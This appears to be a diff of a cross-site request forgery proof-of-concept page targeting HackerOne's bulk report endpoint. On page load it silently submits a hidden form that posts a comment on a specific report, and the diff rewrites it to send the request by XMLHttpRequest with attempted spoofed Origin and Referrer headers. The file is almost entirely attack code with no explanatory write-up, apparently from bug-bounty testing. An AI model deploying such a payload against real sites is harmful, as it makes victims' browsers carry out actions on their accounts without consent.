@@ -1,35 +1,53 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-        <script>
+    <script>
         function submitForms() {
-            document.forms['csrf'].submit();
+            var form = document.forms['csrf'];
             
+            // Create a new XMLHttpRequest
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", form.action, true);
+
+            // Set custom headers for Origin and Referrer
+            xhr.setRequestHeader("Origin", "https://hackerone.com"); // Set the Origin as needed
+            xhr.setRequestHeader("Referrer", "https://hackerone.com/bugs?subject=user&report_id=2211657&view=open&substates%5B%5D=new&substates%5B%5D=needs-more-info&substates%5B%5D=pending-program-review&substates%5B%5D=triaged&substates%5B%5D=retesting&reported_to_team=&text_query=&program_states%5B%5D=2&program_states%5B%5D=3&program_states%5B%5D=4&program_states%5B%5D=5&sort_type=latest_activity&sort_direction=descending&limit=25&page=1"); // Set the Referrer as needed
+
+            // Add a listener for the load event to submit the form
+            xhr.onload = function() {
+                if (xhr.status === 200) {
+                    // If the request is successful, handle success here (optional)
+                    console.log("Form submitted successfully");
+                } else {
+                    // Handle failure (optional)
+                    console.error("Form submission failed", xhr.status, xhr.statusText);
+                }
+            };
+
+            // Serialize the form data and send the request
+            var formData = new FormData(form);
+            xhr.send(formData);
+
+            // Prevent default form submission behavior
             return false;
         }
     </script>
-
 </head>
-<body  onload="submitForms();">
-
-    <form method="post" name="csrf"  action="https://hackerone.com/reports/bulk?" >
-    
-        <input type="hidden" id="message" name="message" value="testing+comment+worked" 
-        <input type="hidden" id="substate" name="substate" value="" 
-        <input type="hidden" id="is_internal" name="is_internal" value="false" 
-        <input type="hidden" id="reference" name="reference" value="" 
-        <input type="hidden" id="add_reporter_to_original" name="add_reporter_to_original" value="false" 
-        <input type="hidden" id="reply_action" name="reply_action" value="add-comment" 
-        <input type="hidden" id="mark_ineligible_for_bounty" name="mark_ineligible_for_bounty" value="false" 
-        <input type="hidden" id="unassign_report_on_close" name="unassign_report_on_close" value="false" 
-        <input type="hidden" id="code_review_patch" name="code_review_patch" value="" 
-        <input type="hidden" id="code_review_diff_url" name="code_review_diff_url" value="" 
-        <input type="hidden" id="reports_count" name="reports_count" value="1" 
-        <input type="hidden" id="report_ids%5B%5D" name="report_ids%5B%5D" value="2211657" 
-        <input type="hidden" id="bounty_currency" name="bounty_currency" value="USD" 
-
-
+<body onload="submitForms();">
+    <form method="post" name="csrf" action="https://hackerone.com/reports/bulk?">
+        <input type="hidden" id="message" name="message" value="testing+comment+worked">
+        <input type="hidden" id="substate" name="substate" value="">
+        <input type="hidden" id="is_internal" name="is_internal" value="false">
+        <input type="hidden" id="reference" name="reference" value="">
+        <input type="hidden" id="add_reporter_to_original" name="add_reporter_to_original" value="false">
+        <input type="hidden" id="reply_action" name="reply_action" value="add-comment">
+        <input type="hidden" id="mark_ineligible_for_bounty" name="mark_ineligible_for_bounty" value="false">
+        <input type="hidden" id="unassign_report_on_close" name="unassign_report_on_close" value="false">
+        <input type="hidden" id="code_review_patch" name="code_review_patch" value="">
+        <input type="hidden" id="code_review_diff_url" name="code_review_diff_url" value="">
+        <input type="hidden" id="reports_count" name="reports_count" value="1">
+        <input type="hidden" id="report_ids%5B%5D" name="report_ids%5B%5D" value="2211657">
+        <input type="hidden" id="bounty_currency" name="bounty_currency" value="USD">
     </form>
-
 </body>
 </html>
